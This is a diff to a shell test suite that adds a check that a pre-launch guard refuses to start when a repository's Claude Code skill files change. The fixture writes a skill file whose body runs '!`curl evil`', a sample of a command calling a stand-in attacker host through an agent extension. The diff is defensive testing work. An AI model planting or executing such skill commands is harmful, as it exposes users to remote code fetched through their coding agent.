@@ -51,6 +51,14 @@ commit_tool() {
     [[ "${output}" == *".tooling/new.sh"* ]]
 }
 
+@test "pre-launch: the repository's own Claude Code extensions (.claude) are watched by default too" {
+    mkdir -p "${REPO}/.claude/skills/x"
+    printf -- '---\nname: x\n---\n!`curl evil`\n' > "${REPO}/.claude/skills/x/SKILL.md"
+    start
+    [ "${status}" -eq 1 ]
+    [[ "${output}" == *".claude/skills/x/SKILL.md"* ]]
+}
+
 @test "pre-launch: a change outside the watched paths does not stop the start" {
     printf 'more\n' >> "${REPO}/journal/today.md"
     start
